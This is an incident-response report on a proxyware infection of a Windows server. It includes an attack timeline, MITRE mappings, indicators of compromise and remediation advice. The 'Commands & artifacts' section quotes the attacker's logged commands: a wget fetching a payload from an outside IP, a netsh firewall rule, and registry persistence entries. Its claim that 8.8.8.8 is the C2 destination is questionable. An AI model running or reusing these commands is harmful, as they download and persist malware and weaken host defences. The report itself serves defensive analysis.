**Analyst: YB**

**Tactics**: `#Execution` `#Persistence` `#Defense_Evasion` `#Command_and_Control`

**IDs**: `#TA0002` `#TA0003` `#TA0005` `#TA0011` 

**Techniques:** `#Malicious_File` `#Boot_Logon_Autostart` `#Disable_Modify_Firewall #Application_Layer_Protocol_DNS` 
**IDs:** `#T1204.002` - `#T1547` - `#T1562.004` - `#T1071.004`

**Report:** INC-KCD-001

## Executive summary

Threat hunting on **KCD-Web** on **April 20, 2026** turned up a fully deployed multi-stage malware infection running under **`NT AUTHORITY\\SYSTEM`** privileges. The attack started when a compromised service account (**`ftp$`**) ran a self-extracting dropper called **`HRSword.exe`**, which pulled a secondary payload (**`p2.exe`**) from a remote server at **`82.147.85.6`**. That payload dropped a set of binaries into a disguised system directory (**`C:\\Windows\\Fonts\\init\\`**) and set up two persistence mechanisms via registry edits. The core implant, **`client.exe`**, made 88 outbound connections to **`8.8.8.8`** in one hour, classic C2 beaconing. A registry key named **Peer2Profit** points to a bandwidth-monetization scheme: the attacker routes victim traffic through their own infrastructure to sell access. A masqueraded **`svchost.exe`** also ran a second payload (**`wahiver.exe`**) that connected to external servers. This host is actively compromised and should be treated as fully untrusted.

## Findings

- **AlertID: C2-Beaconing-Alert #001**

**`client.exe`** made 88 connections to **`8.8.8.8`** in one hour, confirmed automated C2 beaconing
Attack chain kicked off via compromised service account **`ftp$`**
Secondary payload pulled from remote server **`82.147.85.6`** using wget
Two persistence mechanisms set up: boot execution and Run key registry entries
Firewall rule (named "Windows Locator") added to allow inbound traffic to client.exe
Masqueraded **`svchost.exe`** dropped in non-standard path **`C:\\Windows\\fonts\\w\\`** and used to run **`wahiver.exe`**
wasp.exe created a named pipe mimicking Chrome
Files dropped by **`p2.exe`** in **`C:\\Windows\\Fonts\\init\\`**:
Contacted domains include known Russian platforms (**`habrahabr[.]ru`**, **`vk[.]com`**, m**`ail[.]ru`**), likely used to blend C2 traffic with normal browsing

## Investigation summary

Splunk telemetry from **KCD-Web** showed an active, multi-stage compromise running at the highest privilege level on the system, **`NT AUTHORITY\\SYSTEM`**. The infection timeline spans two separate dates, suggesting the attacker had prior staging access before deploying the main payload.
The earliest recorded activity **(2026-02-12)** shows **`HRSword.exe`** loading **`urlmon.dll`**, a Windows URL handling library, meaning the malware could already communicate over the network at that stage. A concurrent registry modification at that timestamp suggests early persistence attempts before full deployment.

The main attack chain executed on **2026-04-08**, starting at 08:51 when the compromised account ftp$ launched HRSword.exe. Within two minutes, **`ftp$`** used wget to pull **`p2.exe`** directly from **`82.147.85.6`**, a remote server hosting the secondary payload behind basic HTTP authentication. **`p2.exe`** then dropped a collection of binaries into **`C:\\Windows\\Fonts\\init\`** -a non-standard path to blend in with legitimate Windows font directories. This directory housed the primary implant, client.exe, along with tools for service installation (**instsrv.exe,** **`srvany.exe`**) and additional unknown payloads (**`1.exe`**, **`2.exe`**).

Seconds after the file drops, **`netsh.exe`** created a firewall rule named "**Windows Locator**" to permit inbound connections to **`client.exe`**. Registry entries were written at the same time to ensure client.exe survives both system reboots (via the **`Wininit`** service parameter) and user logins (via a Run key named **Peer2Profit** under the default user hive). The **Peer2Profit** registry key name is a significant finding: **Peer2Profit** is a known bandwidth-monetization platform that routes victim machine traffic through attacker-controlled infrastructure, letting the attacker profit from the compromised host's network resources. This explains the high volume of beaconing activity to **`8.8.8.8`** and the presence of multiple external IP addresses in network logs.

Shortly afterward,, a masqueraded **`svchost.exe`** binary placed in **`C:\\Windows\\fonts\\w`** (again mimicking a legitimate path) executed by **`services.exe`** to launch **`wahiver.exe`**. This secondary payload set up its own outbound connections to external infrastructure, suggesting a separate C2 channel or payload stage running in parallel.
Russian platforms (**`habrahabr[.]ru`**, **`vk[.]com`**, **`mail[.]ru`**) in the domain **IOC** list indicates the attacker may be using legitimate web services as dead-drop C2 channels, a technique designed to blend malicious traffic with normal web browsing patterns and evade domain-based detection.

## The 5w - 1h

### Who

Unknown threat actor using a compromised service account (**`ftp$`**) to operate under **SYSTEM** privileges. Observed domains and external IPs point to Russian-linked infrastructure and tooling, though formal attribution is not confirmed.

### What

A fully staged multi-phase malware deployment, including dropper execution, secondary payload retrieval, binary staging, dual persistence, firewall modification, C2 beaconing, and a second lateral execution chain via masqueraded **`svchost.exe`**.

### When

Initial loader activity observed **2026-02-12 04:55**. Core attack chain executed **2026-04-08** between **08:51** and **08:54** (approximately 3 minutes for full deployment). C2 beaconing (88 connections in 1 hour) observed post-deployment.

### Where

Host **KCD-Web**, exclusively in **`C:\\Windows\\Fonts\\init\\`** and **`C:\\Windows\\fonts\\w`** -non-standard directories chosen to evade casual path inspection.

### Why

The **Peer2Profit registry key** identifies the primary objective as bandwidth monetization: the attacker profits by selling the victim host's network capacity. Secondary objectives (via wahiver.exe and external connections) may include separate C2 capability for further lateral movement or data collection.

### How

**`ftp$`** account (likely already compromised or a pre-planted service account) executed **`HRSword.exe`** -> **`HRSword.bat`** was called from a self-extracting temp archive ->  **`p2.exe`** downloaded from **`82.147.85.6`** via wget ->  binaries staged in font directory ->  **`netsh.exe`** opened firewall ->  registry persistence written ->  **`client.exe`** began beaconing ->  wasp.exe created a **`Chrome-mimicking`** named pipe ->  masqueraded **`svchost.exe`** executed **`wahiver.exe`** for secondary C2. The compressed execution window (~3 minutes) suggests an automated deployment script.

## Commands & artifacts (exact as logged)

```
"C:\\Windows\\System32\\cmd.exe" /c @pushd "C:\\Users\\ftp$\\AppData\\Local\\Temp\\7ZipSfx.000" >nul 2>&1 & CALL "C:\\Users\\ftp$\\AppData\\Local\\Temp\\7ZipSfx.000\\HRSword.bat"
```

```
wget <http://1:1@82.147.85.6/p2.exe> -O C:\\Windows\\p2.exe
```

```
netsh advfirewall firewall add rule name="Windows Locator" dir=in action=allow program="C:\\windows\\fonts\\init\\client.exe" enable=yes
```

```
Path: HKLM\\System\\CurrentControlSet\\Services\\Wininit\\Parameters\\Application
Value: C:\\windows\\fonts\\init\\client.exe
```

```
Path: HKU\\.DEFAULT\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Peer2Profit
Value: "C:\\windows\\fonts\\init\\client.exe" --minimize
```

```
C:\\Windows\\fonts\\w\\svchost.exe run
```

## Indicators of compromise

### Malicious files

```
HRSword.exe, HRSword.bat, ServiceE.exe, wahiver.exe, client.exe, p2.exe, wasp.exe, 1.exe, 2.exe, go.bat, instsrv.exe, srvany.exe
```

### Malicious paths

```
C:\\Windows\\Fonts\\init\\
C:\\Windows\\fonts\\w\\
C:\\Users\\ftp$\\AppData\\Local\\Temp\\7ZipSfx.000\\
C:\\Windows\\p2.exe
```

### Ip addresses

```
82.147.85.6 (payload download server)
178.248.233.33
185.180.201.1
185.213.157.164
87.240.129.133
87.240.132.67
87.240.132.72
87.240.132.78
87.240.137.164
89.221.239.1
90.156.232.4
8.8.8.8 (C2 beacon destination)
```

### Domains

```
testdomainlocalsecololoalala234nhv[.]wtd
habrahabr[.]ru
node0[.]waspace[.]net
mail[.]ru
vk[.]com
```

### Named pipe

```
\\chrome.4964.2.205802953
```

### Account

```
ftp$
```

## Recommendations

### Immediate response

Isolate **KCD-Web** from the network immediately -the host is actively beaconing and must be treated as fully compromised.
Disable and audit the **`ftp$`** account -determine how credentials were obtained and whether other systems are at risk.
Remove the firewall rule "**Windows Locator**" and block outbound traffic to all listed IPs at the perimeter firewall.
Delete malicious files from **`C:\\Windows\\Fonts\\init\\`** and **`C:\\Windows\\fonts\\w\\`** and purge associated registry keys.

### Detection & hardening

Implement monitoring for:
Enforce least privilege on service accounts **`-ftp$`** should not have the ability to execute binaries or make outbound web requests.
Review all service accounts for signs of prior compromise.

## References

- **MITRE ATT&CK T1547** - Boot or Logon Autostart Execution
- **MITRE ATT&CK T1562.004** - Impair Defenses: Disable or Modify System Firewall
- **MITRE ATT&CK T1071.004** - Application Layer Protocol: DNS
- **Peer2Profit** - **Proxyware Overview** - Background on bandwidth-monetization malware